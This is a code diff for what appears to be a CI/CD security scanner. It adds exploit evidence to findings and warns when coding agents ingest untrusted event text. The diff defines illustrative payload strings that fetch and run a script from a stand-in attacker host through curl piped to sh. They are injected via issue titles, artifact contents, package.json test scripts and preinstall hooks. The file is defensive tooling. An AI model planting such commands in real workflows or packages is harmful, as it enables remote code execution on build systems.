@@ -16,7 +16,7 @@ import type {
   DependencyNode,
   SinkNode,
 } from '../graph/types';
-import { type Finding, tierForSink } from '../findings/finding';
+import { type Finding, type FindingEvidence, tierForSink } from '../findings/finding';
 import { agenticLabel, mcpLabel } from '../taxonomy/owasp';
 import type { BuildResult } from './build';
 
@@ -45,6 +45,69 @@ function isGuardedForkPr(path: ReachPath): boolean {
   return path.entry.entryKind === 'fork-pr' && path.entry.guarded === true;
 }
 
+/**
+ * Fixed illustrative payloads per fail-eligible sink class (0048 / KTD6). Never derived from
+ * repo content, so they cannot echo a secret; renderers keep them off public surfaces (R10).
+ */
+const PAYLOAD = {
+  text: 'Issue/PR title or comment: x"; curl -s https://attacker.example/p.sh | sh; echo "',
+  artifact: 'Artifact file contents: $(curl -s https://attacker.example/p.sh | sh)',
+  forkPr:
+    'The PR edits a script this step runs, e.g. package.json "test": "curl -s https://attacker.example/p.sh | sh"',
+  install:
+    'The PR adds a dependency with "preinstall": "curl -s https://attacker.example/p.sh | sh"',
+} as const;
+
+/**
+ * Where the path's attacker input lands, and — when the path is a proven exploit shape —
+ * the payload that demonstrates it (0048 / KTD5). A path is fail-eligible only for: an
+ * untrusted-text entry with an `execution` sink, a fork-PR whose job runs code after the
+ * untrusted checkout, or a new dependency whose install script runs in a fork-triggerable
+ * job. Anything else gets location-only evidence (or none) and can at most warn.
+ */
+function proof(path: ReachPath): { at?: { file: string; line: number }; payload?: string } {
+  const job = find<CiJobNode>(path, 'ci-job');
+  const dep = find<DependencyNode>(path, 'dependency');
+  switch (path.entry.entryKind) {
+    case 'untrusted-text-injection': {
+      const at = path.entry.evidence;
+      if (path.entry.sinkClass !== 'execution') {
+        return { at };
+      }
+      return {
+        at,
+        payload: path.entry.label.includes('artifact') ? PAYLOAD.artifact : PAYLOAD.text,
+      };
+    }
+    case 'fork-pr':
+      return { at: job?.execEvidence, payload: job?.execEvidence ? PAYLOAD.forkPr : undefined };
+    case 'new-dependency':
+      if (dep && job?.forkTriggerable) {
+        return {
+          at: job.installEvidence,
+          payload: job.installEvidence ? PAYLOAD.install : undefined,
+        };
+      }
+      return {};
+    default:
+      return {};
+  }
+}
+
+/** Assemble `Finding.evidence` from a path's proof; `undefined` when nothing is locatable. */
+function evidenceFor(path: ReachPath): FindingEvidence | undefined {
+  const { at, payload } = proof(path);
+  if (!at) {
+    return undefined;
+  }
+  return {
+    file: at.file,
+    line: at.line,
+    capability: path.sink.identity,
+    ...(payload ? { payload } : {}),
+  };
+}
+
 /** Derive the reachability reason + remediation from the path's cross-layer shape. */
 function describe(path: ReachPath): { reason: string; remediation: string } {
   const dep = find<DependencyNode>(path, 'dependency');
@@ -67,6 +130,34 @@ function describe(path: ReachPath): { reason: string; remediation: string } {
         remediation:
           `Never splice downloaded-artifact contents into a shell; pass the artifact as a quoted argument ` +
           `to a trusted committed script, validate it, and keep ${sink.identity} out of the workflow_run job.`,
+      };
+    }
+    const cls = path.entry.sinkClass;
+    if (cls === 'agent-ingested') {
+      return {
+        reason:
+          `${path.entry.label} — a coding agent in job ${where} ingests attacker-authored event text while ` +
+          `the job holds ${sink.sinkKind} ${sink.identity}. Agent ingestion is not a proven exploit on its ` +
+          `own: whether the agent can be steered to reach ${sink.identity} depends on its tools and outbound ` +
+          `access, which Blastgate does not yet model — so this warns rather than fails.`,
+        remediation:
+          `Keep ${sink.identity} out of the agent job, restrict the workflow to trusted actors, and deny the ` +
+          `agent shell/network tools it does not need (the Agents Rule of Two).`,
+      };
+    }
+    if (cls === 'action-input' || cls === 'unrecognized') {
+      const where2 =
+        cls === 'action-input'
+          ? 'a third-party action input'
+          : 'a field Blastgate does not classify';
+      return {
+        reason:
+          `${path.entry.label} — attacker-authored event text is passed to ${where2} in job ${where}, which ` +
+          `holds ${sink.sinkKind} ${sink.identity}. Whether that input is executed depends on code Blastgate ` +
+          `cannot see offline, so this warns rather than fails.`,
+        remediation:
+          `Pass untrusted text via \`env:\` and quote it, review how the action uses the input, and remove ` +
+          `${sink.identity} from the untrusted-triggered job ${where}.`,
       };
     }
     return {
@@ -209,9 +300,28 @@ function describe(path: ReachPath): { reason: string; remediation: string } {
   };
 }
 
+/**
+ * The fail contract (0048 / KTD5, plan R1/R8): `fail` requires a secret or code-write sink,
+ * a fail-eligible entry, and complete evidence including the payload. Everything else that
+ * is reachable warns. The actor-guard downgrade (U17) still applies on top.
+ */
+function tierFor(path: ReachPath, evidence: FindingEvidence | undefined): 'fail' | 'warn' {
+  if (isGuardedForkPr(path) || tierForSink(path.sink.sinkKind) !== 'fail') {
+    return 'warn';
+  }
+  return evidence?.payload ? 'fail' : 'warn';
+}
+
 function toFinding(ranked: RankedFinding): Finding {
   const { path, labels, score } = ranked;
   const { reason, remediation } = describe(path);
+  const proven = evidenceFor(path);
+  const tier = tierFor(path, proven);
+  // The payload is a fail's proof; a warn keeps only the location + capability pointer.
+  const evidence =
+    proven && tier !== 'fail'
+      ? { file: proven.file, line: proven.line, capability: proven.capability }
+      : proven;
   const labelStrings = [
     labels.agentic ? agenticLabel(labels.agentic) : undefined,
     labels.mcp ? mcpLabel(labels.mcp) : undefined,
@@ -219,9 +329,8 @@ function toFinding(ranked: RankedFinding): Finding {
 
   return {
     id: `${path.entry.id}=>${path.sink.id}`,
-    // An actor-gated fork-PR path is not externally attacker-controllable → warn, not
-    // fail (U17); still reported because the broad credential scope is a real risk.
-    tier: isGuardedForkPr(path) ? 'warn' : tierForSink(path.sink.sinkKind),
+    // Proven-exploit contract (0048); an actor-gated fork-PR path warns (U17).
+    tier,
     score,
     path: path.nodes.map(nodeLabel),
     pathNodeIds: path.nodes.map((n) => n.id),
@@ -232,6 +341,7 @@ function toFinding(ranked: RankedFinding): Finding {
     remediation,
     owasp: labels,
     labels: labelStrings,
+    ...(evidence ? { evidence } : {}),
   };
 }
 
